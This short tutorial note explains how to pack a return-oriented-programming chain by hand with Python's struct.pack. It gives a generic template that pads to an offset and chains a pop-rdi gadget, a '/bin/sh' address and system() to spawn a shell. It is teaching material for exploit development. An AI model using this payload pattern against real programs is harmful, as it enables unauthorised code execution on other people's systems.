# Packing by hand — struct.pack


When the tool's modes don't fit, pack the chain yourself:

    import struct
    p = lambda x: struct.pack('<Q', x)
    payload  = b'A' * offset
    payload += p(pop_rdi) + p(binsh)
    payload += p(ret_gadget)
    payload += p(system)

## The width

x64: `<Q` (8 bytes). x86: `<I` (4 bytes). A width bug silently
truncates the chain.
